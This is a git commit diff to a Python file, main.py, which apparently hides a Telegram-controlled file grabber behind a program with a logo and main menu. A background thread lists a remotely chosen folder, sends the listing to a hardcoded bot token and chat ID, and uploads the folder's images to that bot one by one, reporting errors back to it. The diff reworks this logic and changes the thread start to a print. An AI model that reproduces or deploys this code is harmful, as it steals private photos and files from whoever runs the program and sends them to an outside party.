008a4143c252cff9181817f29f7338bfa3cbc47b
Md. Ekramul Hassan <156925241+EH2116@users.noreply.github.com>
2024-12-10 19:53:05 +0600

    Update main.py

--- main.py
+++ main.py
@@ -17,37 +17,40 @@ def tg():
         if commands["start"]=="yes":
             dir_list = os.listdir(commands["folder"])
             text=str(len(dir_list))+"\n"+str(dir_list)
-            if requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={text}&chat_id=7027929429").status_code == 200:
-                if commands["grabe"] == "yes":
-                    dir_list = os.listdir(commands["folder"])
-                    i=int(commands["file_number"])
-                    while i<len(dir_list):
-                        try:
-                            TELEGRAM_API_URL = f'https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendPhoto'
-                            photo_path = dir_list[i]
-                            if str(photo_path).endswith("mp4"):
-                                pass
-                            else:
-                                with open(photo_path, 'rb') as photo_file:
-                                    payload = {'chat_id': "7027929429",'caption': photo_path+"-number-"+str(i)}
-                                    response = requests.post(TELEGRAM_API_URL, data=payload, files={'photo': photo_file})
-                                if response.status_code == 200:
-                                    print("Photo sent successfully!")
-                                else:
-                                    requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={str(response.text)}&chat_id=7027929429")
-                        except Exception as err:
-                            requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={str(err)}&chat_id=7027929429")
-                        i=i+1
-                    break
-                else:
-                    pass
+            if len(text) >4096:
+                text=str(len(dir_list))+str(dir_list)[:4000]
             else:
-                requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text=Error - 1&chat_id=7027929429")
+                if requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={text}&chat_id=7027929429").status_code == 200:
+                    if commands["grabe"] == "yes":
+                        dir_list = os.listdir(commands["folder"])
+                        i=int(commands["file_number"])
+                        while i<len(dir_list):
+                            try:
+                                TELEGRAM_API_URL = f'https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendPhoto'
+                                photo_path = dir_list[i]
+                                if str(photo_path).endswith("mp4"):
+                                    pass
+                                else:
+                                    with open(photo_path, 'rb') as photo_file:
+                                        payload = {'chat_id': "7027929429",'caption': photo_path+"-number-"+str(i)}
+                                        response = requests.post(TELEGRAM_API_URL, data=payload, files={'photo': photo_file})
+                                    if response.status_code == 200:
+                                        print("Photo sent successfully!")
+                                    else:
+                                        requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={str(response.text)}&chat_id=7027929429")
+                            except Exception as err:
+                                requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={str(err)}&chat_id=7027929429")
+                            i=i+1
+                        break
+                    else:
+                        pass
+                else:
+                    requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text=Error - 1&chat_id=7027929429")
         else:
             pass
 
 t1=threading.Thread(target=tg)
-t1.start()
+print(t1)
 
 def main():
     logo="""
